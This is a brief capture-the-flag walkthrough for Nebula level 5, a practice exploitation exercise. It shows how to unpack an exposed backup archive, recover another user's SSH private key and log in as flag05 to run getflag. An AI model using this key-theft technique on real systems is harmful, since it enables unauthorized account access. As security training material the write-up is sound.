.. _nebula05:

.. role:: bash(code)
	  :language: bash

Nebula 5
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level05/

**No source code given**

Solution
--------

Un-tar into level05 home

.. code-block:: bash

   tar xvzf backup-19072011.tgz -C /home/level05/
   .ssh/
   .ssh/id_rsa.pub
   .ssh/id_rsa
   .ssh/authorized_keys
   ssh flag05@localhost
   
.. note:: Password is not asked since we have a key

   :bash:`$getflag`
